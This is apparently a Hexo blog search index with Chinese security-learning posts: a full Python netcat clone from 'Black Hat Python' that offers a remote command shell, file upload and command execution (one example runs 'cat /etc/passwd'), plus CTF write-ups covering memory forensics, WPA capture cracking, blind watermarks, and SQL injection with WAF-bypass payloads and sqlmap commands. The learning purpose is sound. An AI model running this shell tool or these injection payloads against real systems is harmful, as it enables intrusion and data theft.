<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[python版netcat]]></title>
    <url>%2F2018%2F10%2F01%2Fpython%E7%89%88netcat%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;为了增进自己的python编程水平，于是选了《python黑帽子编程》这本书，写完一个小作业感觉受益良多，懂了些服务器客户端的通信方式，希望自己能够坚持下去。 我已经将相关代码放到我的github，详情请点击链接，为了伟大的开源精神而干杯（手动doge） 具体代码，详情见注释123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226# -*- coding:UTF-8 -*-import sysimport socketimport getoptimport threadingimport subprocessimport time# 定义全局变量listen = Falsecommand = Falseexecute = ""target = ""upload_destination = ""port = 0def usage(): # 帮助说明 print("BHP Net Tool\n\n") print("Usage: nc.py -t target_host -p port") print( "-l --listen \ - listen on [host]:[port] for incoming connections") print("-e --execute=file_to_run \ -command execute the given file upon receiving a connection") print("-c --command - initialize a command shell") print( "-u --upload=destination \ - upon receiving connection upload \ a file and write to [destination]\n\n") print("Examples: \n") print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c") print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe") print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"") print("echo 'ABCDEF' | nc.py -t 192.168.11.12 -p 135") sys.exit(0)def server_loop(): global target # 如果没有定义目标，那么我们监听所有接口 if not len(target): target = "0.0.0.0" server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.bind((target, port)) server.listen(5) while True: client_socket, addr = server.accept() # 分拆一个线程处理新的客户端，client_socket返回一个socket对象（对应每个连接的对象）addr是具体的ip和端口 try: client_thread = threading.Thread( target=client_handler, args=(client_socket,)) client_thread.start() except Exception as e: print(e)def client_sender(buffer): client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket对象 try: # 连接到目标主机 client.connect((target, port)) client.settimeout(30) if len(buffer)!=0: client.send(buffer.encode()) while True: # 现在等待数据回传 recv_len = 1 response = "" while recv_len: data = client.recv(4096).decode("utf-8") recv_len = len(data) response += data if recv_len &lt; 4096: # 一次接受4096个字节 break print("client: "+response.strip("\n")) # 等待更多输入 buffer = "server: " buffer += input() buffer += "\n" # 发送出去 client.send(buffer.encode()) except Exception as e: print(e) print("[*] Exception! Exiting") # 关闭连接 client.close()def run_command(command): # 换行 command = command.rstrip() # 运行命令并将输出返回 try: output = subprocess.check_output( command, stderr=subprocess.STDOUT, shell=True, universal_newlines=True) # 命令执行模块 except: output = "Failed to execute command.\r\n" # 将输出发送 return outputdef client_handler(client_socket): global execute global command # 检测上传文件 if len(upload_destination): # 读取所有字符并写下目标 file_buffer = "" # 持续读取数据直到没有符合的数据 while True: data = client_socket.recv(1024).decode("utf-8") if not data: break else: file_buffer += data if "#" in file_buffer: file_buffer = file_buffer[:-2] break # 现在我们接收这些数据并将它们写出来 try: file_descriptor = open(upload_destination, "wb") file_descriptor.write(file_buffer.encode()) file_descriptor.close() # 确认文件已经写出来 client_socket.send(b"Succesfully saved file") except: client_socket.send(b"Failed to saved file") client_socket.close() if len(execute): # 运行命令 output = run_command(execute) client_socket.send(output.encode()) # 如果需要一个命令行shell，那么我们进另一个循环 if command: while True: # 跳出一个窗口 client_socket.send(b"&lt;BHP:#&gt;: ") # 现在我们接受文件直到发现换行符(enter key) cmd_buffer = "" while "\n" not in cmd_buffer: cmd_buffer = client_socket.recv(1024).decode("gbk") # 反还命令输出 response = run_command(cmd_buffer) # 返回相应数据 client_socket.send(response.encode()) # python3中必须以BYTE流进行传输def main(): global listen # 全局变量 global port global execute global command global upload_destination global target# getopt 模块，该模块是专门用来处理命令行参数的 if not(len(sys.argv[1:])): # sys.argv[0]代表脚本本身名称 usage()# 读取命令行 try: opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", [ "help", "listen", "execute=", "target=", "port=", "command=", "upload="]) except getopt.GetoptError as err: print(str(err)) usage() for o, a in opts: if o in ("-h", "--help"): usage() elif o in ("-l", "--listen"): listen = True elif o in ("-e", "--execute"): execute = a elif o in ("-c", "--command"): command = True elif o in ("-u", "--upload"): upload_destination = a elif o in ("-t", "--target"): target = a elif o in ("-p", "--port"): port = int(a) else: assert False, "Unhandled Option" # assert相当于断点，根据后面的表达式的布尔值进行判断，如果错误输出之后的字符串信息。 # 进行监听还是仅从标准输入发送数据？ if not listen and len(target) and (port &gt; 0): buffer = "" # 从命令行读取内存数据 # 这里将会堵塞，所以不在向标准输入发送数据时发送CTRL+D· buffer = input() + '\n' # 发送数据 client_sender(buffer) # 开始监听并准备上传文件、执行命令 # 放置一个反弹SHELL # 取决于上面的命令选项 if listen: server_loop()if __name__ == '__main__': main()]]></content>
      <categories>
        <category>python编程</category>
      </categories>
      <tags>
        <tag>netcat</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[新疆首届知识技能大赛相关writeup]]></title>
    <url>%2F2018%2F09%2F16%2F%E6%96%B0%E7%96%86%E9%A6%96%E5%B1%8A%E7%9F%A5%E8%AF%86%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E7%9B%B8%E5%85%B3writeup%2F</url>
    <content type="text"><![CDATA[总是把比赛想的太简单，原来在哪里总是藏龙卧虎，不能小瞧任何人，也别高看了自己。但是这是第一次参加不让联网的CTF比赛！ stay foolish,stay hungry 如来十三掌通过这个题目，让我联想到与佛论禅和rot13加密，那么打开题目，下载下来一个docx文档。下面加粗的文字即是打开文档的内容。 夜哆悉諳多苦奢陀奢諦冥神哆盧穆皤三侄三即諸諳即冥迦冥隸數顛耶迦奢若吉怯陀諳怖奢智侄諸若奢數菩奢集遠俱老竟寫明奢若梵等盧皤豆蒙密離怯婆皤礙他哆提哆多缽以南哆心曰姪罰蒙呐神。舍切真怯勝呐得俱沙罰娑是怯遠得呐數罰輸哆遠薩得槃漫夢盧皤亦醯呐娑皤瑟輸諳尼摩罰薩冥大倒參夢侄阿心罰等奢大度地冥殿皤沙蘇輸奢恐豆侄得罰提哆伽諳沙楞缽三死怯摩大蘇者數一遮 首先我们打开与佛论禅，在其加密内容前加上佛曰：。如图所下：下面是这个解出来密文，显然还有一层加密。MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9猜测base64编码，结果没有解出来。联系题目猜测为rot13加密解码出来继续base64解码，在此之后我会写相关的加密的详解。 取证内存镜像flag这道题给了hint才知道是内存取证，但是因为自己起初没在意相关工具的使用其实就是自己懒，那么这次的惨败正好弥补自己的不足。 volatility是专门进行内存取证的工具，对于windows系统比较友好，linux系统需要单独的安装相应的插件。1-f 选择所要取证的镜像文件 进行镜像识别1imageinfo 我们可以发现volatility建议我们使用WinXPSP2x86，那么继续使用查看当时的dump下来的内存中存在的进程1--profile 使用哪一种镜像进行取证 1pslist 查看当时dump下来所运行的进程 然而根据题目，我们猜测应该在是某个文件，那么扫描目录，其中为了查询相关字符，进行了管道命令以及grep进行筛选。1filescan 文件扫描 那么下面我就进行导出其相关文件。1dumpfiles 导出文件 1-Q 所要导出文件的地址 1--dump-dir 导出文件所要存在那个目录里 打开发现这个压缩包需要密码，我猜测了许多种可能，密码应该在剪切板中，于是搜索剪切板的内容1clipboard 查看剪切板的内容 于是尝试是否这个剪切板的内容就是密码，获得flag 这个是真·取证，让我感觉到这个CTF还是能够提高我在安全的其他方面的。 流量包解密02&nbsp;&nbsp;果然还是见识少，所有的比赛的束手无措只是自己平时懒所付出的代价。下载下来一看，文件是.cap结尾的格式，那么应该是WiFi所抓下来的包，而且题目提示密码就是本机的MAC地址。那么我们需要用到aircrack-ng工具解密流量。 先用wireshark打开流量包可以看到我们MAC地址（无线&gt;wlan流量） aircrack-ng解密流量，有个坑密码MAC地址大写1-w 使用密码字典 然后将key值导入进去(首选项&gt;protpcols&gt;IEEE 802.11&gt;Decryption key&gt;wpa-key)然后追踪TCP流最后查看网址找到了flag Refererhttps://blog.csdn.net/qq_28208251/article/details/48093575https://xz.aliyun.com/t/1972http://netsecurity.51cto.com/art/201105/264844.htmhttps://blog.csdn.net/dmbjzhh/article/details/79425483 如果有同学需要上述题目，请联系我]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>比赛wp</tag>
        <tag>CRYPTO</tag>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[照片里的盲水印]]></title>
    <url>%2F2018%2F09%2F02%2F%E7%85%A7%E7%89%87%E9%87%8C%E7%9A%84%E7%9B%B2%E6%B0%B4%E5%8D%B0%2F</url>
    <content type="text"><![CDATA[这个题是安恒月赛里面的一道misc类型的题，在CTF中misc所谓最考验你的脑洞和检验你的赛事水平（赛棍？？？）但是这个方面还是要看一下，就当做开发脑力了。 题目：暴力可解题目文件下载下来题目，打开压缩包解压发现有密码，猜测压缩包伪加密，使用010editor发现并没有伪加密，联系题目使用暴力破解，基本CTF所有让你暴力破解都是纯数字类型。获得密码，解压得到两张相同的图片。在misc中，两张相同的图片基本上都应该是盲水印，所以使用bwm脚本（python2）。bwm脚本的github运行脚本发现没有cv2这个模块，使用下面的命令安装cv2pip install opencv-python然后运行python bwm.py decode 1.png 2.png flag.png。其中1.png和2.png是解压所得图片，flag.png是所分离出来的水印。下图即为水印。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>MISC</tag>
        <tag>盲水印</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL报错注入]]></title>
    <url>%2F2018%2F08%2F17%2FSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[快草了两个月的bugku-web类型的题，感觉基本web类型都有了一些大概的了解，当然比不上dalao的掌控雷电的操作，后面就是多玩一会python了，毕竟CTF中脚本不会写是真的硬伤。 这道题是web-150分的题，看了一下网上的WP不多，我也是找了一堆资料，看了看相似的体型才把这道题做的差不多。 题名：多次，网址链接 首先打开网页看到id这个参数，很经典的SQL注入。于是测试单引号过滤?id=1’，页面发生变化，猜测位查询语句为单引号闭合。再次进行测试，?id=1′ or 1=1%23 ，发现并无变化。猜测可能有WAF过滤，于是测试双重写or，?id=1′ oorr 1=1%23 ，测试发现页面改变 进行测试过滤，使用异或符号（^）搭配length函数开始测试。 如何判断是否过滤，例如union函数没有过滤，那么length(‘union’)=0是不成立的，即该语句布尔值为0，并且前面的查询语句布尔值恒等于1，1^0=1，1^1=0。则为1返回正常页面，不正常返回错误页面。经测试：or，and，union，select被过滤。那么接下来就是常规测试。 ?id=1%27 oorrder by 2%23，测试列数为2。（注意order里面的or） 爆数据库?id=-1%27 uniounionn selecselectt 1,group_concat(schema_name) from infoorrmation_schema.schemata%23（坑点：information里面的or） 爆表?id=-1%27 uniounionn selecselectt 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=0x776562313030322d31（十六进制码为web1002-1）%23 爆出数据?id=-1%27 uniounionn selecselectt 1,flag1 from flag1 %23然后题目提示还有一个flag在下一关的地址。根据上面的操作，地址可能在address列里。 寻找下一关地址?id=-1%27 uniounionn selecselectt 1,address from flag1 %23 找到下一关地址OK，还是向上面的一样测试，发现还是单引号过滤。发现还是有回显我们测试的语句，突然发现这个WAF过滤的有点奇怪，这个过滤了union那我将union重写，发现直接不回显，可能是后端的专门对这种产生过滤。因为还发现有报错产生，那么我就进行报错盲注测试。 盲注测试公式：union select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x; 其中version()改成相应的注入语句。公式需要灵活变通，例如本题中的union被过滤，那么将语句改为or and连接的形式，并且适当添加相应的列数。Ps：盲注相关原理在文章末尾链接。 or (select 1 from(select count(),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)2))x from information_schema.schemata group by x)a)%23 因为不能用union进行注入，所以改变一下形式使用or，就这个走了好多弯路，因为or只能使用1个跟1个比，否则将会出错Operand should contain 1 column(s) , 且(select count(),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)2))x from information_schema.schemata group by x)这条语句将会产生一个虚拟表，你在虚拟表进行查询时需要起一个别名，我在这里起的a，于是报错爆来数据库，下面的操作跟第一关一样。但是其中爆数据时产生了一些问题，说是子查询返回超过了一行但是猜测肯定是只有一行的，估计是出题人加了回车产生了换行。解决方法：left((select flag2 from flag2),40)，取前40个字符。 相关链接：https://blog.csdn.net/qq_35544379/article/details/77453019 https://blog.csdn.net/he_and/article/details/80455884 http://wyb0.com/ 两天时间全部花费在这个报错注入上，不过懂了好多SQL上的东西，也算是少有收获。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQLinjection</tag>
        <tag>手动注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLMAP-POST注入]]></title>
    <url>%2F2018%2F08%2F17%2FSQLMAP-POST%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[BUGKU-ctf作为国内著名的ctf联系靶场，拥有丰富的题型加强我们的ctf水平。下面就是一次我认为比较典型的sql post注入题型。 抓包，复制出来打成一个txt文件 sqlmap -r test.txt -p admin_name –dbs因为博主懒的没有在win环境下下载sqlmap，使用kali中自带sqlmap工具。下面简单解释一下工具命令。 -r 指定一个文件。 -p 指定参数，如图我指定提交表单中的admin_name作为参数进行注入。 –dbs 爆出所有的数据库。 点击回车运行，竟然发现无法进行sql注入！ 上图是我进行注入失败，后面继续追加了下面的参数 -v 这个是展现攻击测试的详细过程的程度，一般设为3就足够。 –threads 这个见词知意，为线程数，博主一般将此设为10，这个根据每个人的电脑配置，酌情增加。 sqlmap -r test.txt -p admin_name –dbs –threads 10 -v 3 –level 3 如图，发现这个SQL注入并不是平常的单引号闭合，而是双引号闭合，而sqlmap只有在level=3时才会测试双引号。 解释参数： –level 这个参数表示sqlmap进行测试的程度，数值为1~5，一般将其设为3，因为如果你给的数值越大，代表工具会变慢，很容易影响进度。sqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 –tablesqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 -T flag1 -C flag1 –dump这些就是爆表，爆字段，跟平常的sqlmap使用并无区别，因此不再做详细解释。 解释参数： -D 指定数据库。 -T 指定表。 –table 数据库爆表名。 –dump 显示所有字段。 题目地址]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>SQLinjection</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F07%2F23%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
</search>
